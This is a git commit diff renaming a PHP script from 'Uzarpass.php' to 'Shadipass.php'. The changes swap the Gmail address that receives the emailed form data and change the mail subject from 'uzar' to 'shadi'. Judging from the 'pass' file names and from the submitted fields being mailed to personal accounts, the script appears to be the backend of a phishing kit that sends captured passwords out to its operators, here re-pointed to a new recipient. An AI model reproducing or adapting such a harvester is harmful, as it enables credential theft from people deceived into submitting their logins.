724cc4095f6e50be871469e2b3ff42d9f1caf9a4
Uzar33921 <tiktokworkingsteam@gmail.com>
2025-07-25 02:46:38 +0500

    Update and rename Uzarpass.php to Shadipass.php

--- Shadipass.php
+++ Shadipass.php
@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
-        $mail->addAddress('alnaangeli80@gmail.com');
+        $mail->addAddress('averywilson180@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'uzar';
+        $mail->Subject = 'shadi';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
